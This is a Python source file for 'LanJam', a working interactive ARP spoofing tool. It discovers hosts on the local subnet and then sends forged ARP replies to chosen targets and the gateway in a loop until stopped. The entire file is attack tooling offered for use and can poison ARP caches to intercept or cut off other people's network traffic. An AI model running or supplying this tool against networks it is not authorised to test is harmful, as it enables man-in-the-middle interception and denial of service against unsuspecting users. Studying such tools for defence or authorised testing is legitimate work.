# LANJAM CODED BY github.com/n0nexist

import scapy.all as scapy
import time
import os
from datetime import datetime
import warnings
from scapy.all import ARP, Ether, srp, conf
import socket
import ipaddress
import multiprocessing
from rich.console import Console
from rich.table import Table
from rich import box

try:
    import readline # input history
except:
    pass

# we don't want warnings here
warnings.filterwarnings("ignore")

# global variables
target_list = list()
global_timeout = 2
my_gateway = "192.168.1.1"
thread_list = list()
rich_console = Console()
help_menu = [
    ["help","shows this list"],
    ["discover","discover targets in the local network"],
    ["add","adds a target to the list"],
    ["view","views target list"],
    ["gwip","sets gateway ip"],
    ["timeout","sets arp packets timeout"],
    ["run","start sending packets"],
    ["stop","restore arp tables and stop sending packets"],
    ["quit","quits LanJam"]
]

# LOGGING
def get_timestamp():
    d = datetime.now()
    return f"\033[0m(\033[36m{d.year}_{d.month}_{d.day}-{d.hour}:{d.minute}:{d.second}\033[0m)"

def get_raw_timestamp():
    d = datetime.now()
    return f"{d.year}_{d.month}_{d.day}-{d.hour}:{d.minute}:{d.second}"

def log(level,text):
    if level == "error":
        level = "\033[31mERROR\033[0m"
    if level == "warning":
        level = "\033[33mWARNING\033[0m"
    if level == "info":
        level = "\033[36minfo\033[0m"
    print(f"{get_timestamp()} {level} -> {text}")

# NETWORK STUFF
def getSubnet():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_address = s.getsockname()[0]
    s.close()
    subnet = ipaddress.IPv4Network(f"{ip_address}/24", strict=False)
    return str(subnet)

def discover():
    global rich_console
    log("info","finding devices on local network")
    arp = ARP(pdst=getSubnet())
    ether = Ether(dst='ff:ff:ff:ff:ff:ff')
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]
    devices = []
    table = Table(box=box.MARKDOWN)
    table.add_column("IP", justify="left", style="cyan")
    table.add_column("HOSTNAME", justify="center", style="yellow")
    table.add_column("MAC ADDRESS", justify="right", style="green")
    for sent, received in result:
        ip = received.psrc
        mac = received.hwsrc
        try:
            hostname = socket.gethostbyaddr(ip)[0]
        except:
            hostname = "unknown hostname"
        table.add_row(ip,hostname,mac)
    rich_console.print(table)
        
def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc
  
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
    scapy.send(packet, verbose = False)
  
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = False)
      
def restorearp(gateway_ip,target_ip):
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    log("warning","stopped arp spoofing")

def arpspoof_thread(gateway_ip,target_ip):
    global global_timeout
    log("info",f"started arp spoofing as {gateway_ip} against {target_ip} (timeout={global_timeout})")
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        time.sleep(global_timeout)
    return

# MAIN STUFF
def mainprompt():
    global target_list,global_timeout,thread_list,my_gateway
    while True:
        try:
            cmd = input(f"\033[106m{get_raw_timestamp()}\033[0m % \033[32m").lower()
            if cmd.startswith("help"):
                table = Table(box=box.MINIMAL)
                table.add_column("Command", justify="left", style="cyan")
                table.add_column("Description", justify="right", style="green")
                for x in help_menu:
                    table.add_row(x[0], x[1])
                rich_console.print(table)
                print("\033[0m")
                
            elif cmd.startswith("discover"):
                discover()
                
            elif cmd.startswith("add"):
                try:
                    ip = cmd.split("add ")[1].strip()
                    log("info",f"adding ip {ip} to the target list")
                    target_list.append(ip)
                except:
                    log("warning","correct syntax -> add (ip)")
                    
            elif cmd.startswith("view"):
                print("\033[0m",end="\r")
                table = Table(box=box.ROUNDED)
                table.add_column("TARGETS", justify="left", style="green")
                for x in target_list:
                    table.add_row(x)
                rich_console.print(table)
                    
            elif cmd.startswith("gwip"):
                try:
                    gw = cmd.split("gwip ")[1].strip()
                    log("info",f"setting gateway ip from {my_gateway} to {gw}")
                    my_gateway = gw
                except:
                    log("warning","correct syntax -> gwip (x.x.x.x)")
            
            elif cmd.startswith("timeout"):
                try:
                    timeout = cmd.split("timeout ")[1].strip()
                    log("info",f"setting timeout from {global_timeout} to {timeout}")
                    global_timeout = timeout
                except:
                    log("warning","correct syntax -> timeout (seconds)")
                    
            elif cmd.startswith("run"):
                print()
                gwip = my_gateway
                for x in target_list:
                    p = multiprocessing.Process(target=arpspoof_thread,args=(gwip, x,))
                    p.start()
                    thread_list.append(p)
                    
            elif cmd.startswith("stop"):
                c = 0
                for x in thread_list:
                    c+=1
                    log("info",f"terminating thread n.{c}")
                    x.terminate()
                    thread_list.remove(x)
                log("info","restoring arp tables for every target")
                for x in target_list:
                    restorearp(my_gateway, x)
                
            elif cmd.startswith("quit"):
                log("warning","exiting due to user input")
                exit()
                
        except KeyboardInterrupt:
            print()
            log("warning","exiting due to control-c detection")
            exit(1)
            
        except Exception as e:
            log("error",f"internal exception - {e}")

if os.getuid() != 0:
    log("error","you are not root!")
    exit(-1)

log("info","LanJam booted up")
log("info","created by n0nexist.github.io")
mainprompt()